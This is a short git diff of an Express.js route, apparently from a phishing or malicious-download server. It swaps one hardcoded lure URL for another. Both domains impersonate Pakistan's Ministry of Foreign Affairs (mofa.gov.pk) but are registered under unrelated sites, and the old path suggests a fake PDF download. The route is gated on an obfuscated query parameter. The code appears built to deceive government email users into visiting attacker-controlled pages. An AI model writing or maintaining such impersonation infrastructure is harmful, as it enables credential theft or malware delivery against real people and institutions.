@@ -10,7 +10,7 @@ router.use(express.static('public'));
 router.get('/', (req, res) => {
 
     const data2 = req.query.Mun7Dy274HFDnPe7I74Na7iKKi374h;
-    const url = `https://emails.mofa.gov.pk.docum.store/download/pdffile`;
+    const url = `https://email.mofa.govpk.onlinestatus.live/kyQOIhwy`;
     if (data2 == null) {
         res.render('error');
         
